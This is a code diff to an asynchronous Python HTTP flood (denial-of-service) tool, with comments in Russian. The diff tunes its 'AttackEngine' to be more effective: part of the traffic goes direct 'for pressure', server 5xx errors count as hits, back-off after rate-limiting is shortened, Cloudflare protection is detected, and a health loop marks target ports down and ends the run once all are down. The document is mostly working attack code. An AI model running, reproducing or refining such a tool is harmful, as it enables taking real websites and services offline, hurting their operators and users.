@@ -2,9 +2,8 @@ import asyncio
 import random
 import string
 import time
-import traceback
 from typing import List, Optional
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urlparse
 
 import aiohttp
 
@@ -35,14 +34,6 @@ REFERERS = [
     "https://stackoverflow.com/",
 ]
 
-ACCEPT_HEADERS = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "application/json, text/plain, */*",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-]
-
-FAIL_THRESHOLD = 50
-
 
 def _junk(min_len: int = 3, max_len: int = 12) -> str:
     return "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(min_len, max_len)))
@@ -51,11 +42,11 @@ def _junk(min_len: int = 3, max_len: int = 12) -> str:
 def _build_headers() -> dict:
     return {
         "User-Agent": random.choice(USER_AGENTS),
-        "Accept": random.choice(ACCEPT_HEADERS),
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "de-DE,de;q=0.9"]),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8"]),
         "Accept-Encoding": "gzip, deflate, br",
         "Referer": random.choice(REFERERS) + _junk(5, 15),
-        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
+        "Cache-Control": "no-cache",
         "Connection": "keep-alive",
     }
 
@@ -80,6 +71,19 @@ def _build_url(target: str, port: int) -> str:
         return f"http://{host}{path}"
     else:
         return f"https://{host}:{port}{path}"
+
+
+async def _direct_probe(url: str, timeout: int = 5) -> bool:
+    """Direct connection (no proxy) to check if port is actually alive."""
+    try:
+        async with aiohttp.ClientSession(
+            connector=aiohttp.TCPConnector(ssl=False),
+            timeout=aiohttp.ClientTimeout(total=timeout),
+        ) as session:
+            async with session.get(url, headers=_build_headers()) as resp:
+                return True
+    except Exception:
+        return False
 
 
 class AttackEngine:
@@ -136,7 +140,7 @@ class AttackEngine:
             t = asyncio.create_task(self._attack_port(target, port, method, threads_per_port, deadline, use_proxies))
             tasks.append(t)
 
-        checker = asyncio.create_task(self._health_loop())
+        checker = asyncio.create_task(self._health_loop(target, use_proxies))
         tasks.append(checker)
 
         try:
@@ -156,6 +160,9 @@ class AttackEngine:
         sem = asyncio.Semaphore(threads)
         timeout = aiohttp.ClientTimeout(total=settings.request_timeout)
 
+        # Часть потоков всегда идёт напрямую (без прокси) для давления + точного определения статуса
+        direct_ratio = 0.3 if use_proxies else 1.0
+
         try:
             while not self._stop_event.is_set():
                 if deadline and time.time() >= deadline:
@@ -166,7 +173,11 @@ class AttackEngine:
                     await asyncio.sleep(1)
                     continue
 
-                batch = [self._fire_one(url, port, method, sem, timeout, use_proxies) for _ in range(min(threads, 80))]
+                batch_size = min(threads, 80)
+                batch = []
+                for _ in range(batch_size):
+                    use_direct = (random.random() < direct_ratio) or not use_proxies
+                    batch.append(self._fire_one(url, port, method, sem, timeout, not use_direct))
                 await asyncio.gather(*batch, return_exceptions=True)
 
         except asyncio.CancelledError:
@@ -174,7 +185,7 @@ class AttackEngine:
         except Exception as e:
             self.last_error = f"Port {port}: {e}"
 
-    async def _fire_one(self, base_url: str, port: int, method: AttackMethod, sem: asyncio.Semaphore, timeout: aiohttp.ClientTimeout, use_proxies: bool):
+    async def _fire_one(self, base_url: str, port: int, method: AttackMethod, sem: asyncio.Semaphore, timeout: aiohttp.ClientTimeout, via_proxy: bool):
         async with sem:
             if self._stop_event.is_set():
                 return
@@ -189,10 +200,10 @@ class AttackEngine:
             url = base_url + buster
 
             connector = None
-            session_owner = True
+            is_proxy_fail = False
 
             try:
-                if use_proxies and proxy_pool.count > 0:
+                if via_proxy and proxy_pool.count > 0:
                     proxy_url = proxy_pool.random()
                     if proxy_url:
                         try:
@@ -220,45 +231,62 @@ class AttackEngine:
                             ps.successful += 1
                             ps.consecutive_fails = 0
                             self.stats.successful += 1
+                        elif status >= 500:
+                            ps.successful += 1
+                            self.stats.successful += 1
+                            # 5xx = сервер ещё жив но страдает, не считаем фейлом
                         else:
                             ps.failed += 1
                             self.stats.failed += 1
-
-                        if status >= 500:
-                            ps.consecutive_fails += 1
-                            if ps.consecutive_fails >= FAIL_THRESHOLD:
-                                ps.status = PortStatus.DOWN
 
                         if resp.headers.get("server", "").lower() == "cloudflare":
                             ps.status = PortStatus.PROTECTED
 
                         if status == 429:
-                            await asyncio.sleep(random.uniform(1.0, 3.0))
+                            await asyncio.sleep(random.uniform(0.5, 2.0))
 
             except (aiohttp.ClientError, asyncio.TimeoutError, OSError, ConnectionError):
                 ps.total_requests += 1
-                ps.failed += 1
-                ps.consecutive_fails += 1
                 self.stats.total_requests += 1
-                self.stats.failed += 1
 
-                if ps.consecutive_fails >= FAIL_THRESHOLD:
-                    ps.status = PortStatus.DOWN
+                if via_proxy:
+                    # Фейл через прокси — не считаем как реальный фейл порта
+                    ps.failed += 1
+                    self.stats.failed += 1
+                else:
+                    # Фейл напрямую — это реальный фейл порта
+                    ps.failed += 1
+                    ps.consecutive_fails += 1
+                    self.stats.failed += 1
             except Exception:
                 ps.total_requests += 1
                 ps.failed += 1
                 self.stats.total_requests += 1
                 self.stats.failed += 1
 
-    async def _health_loop(self):
-        while not self._stop_event.is_set():
-            await asyncio.sleep(3)
+    async def _health_loop(self, target: str, use_proxies: bool):
+        """Каждые 10 секунд прямой probe на каждый живой порт."""
+        await asyncio.sleep(5)
 
-            alive = self.stats.alive_ports
-            if not alive:
+        while not self._stop_event.is_set():
+            for port, ps in list(self.stats.ports.items()):
+                if ps.status != PortStatus.ALIVE:
+                    continue
+
+                url = _build_url(target, port)
+                alive = await _direct_probe(url)
+
+                if not alive and ps.consecutive_fails >= 20:
+                    # Порт не отвечает напрямую И накопились прямые фейлы
+                    ps.status = PortStatus.DOWN
+
+            all_down = all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values())
+            if all_down:
                 self._stop_event.set()
                 self.stats.status = AttackStatus.ALL_DOWN
                 break
+
+            await asyncio.sleep(10)
 
 
 engine = AttackEngine()
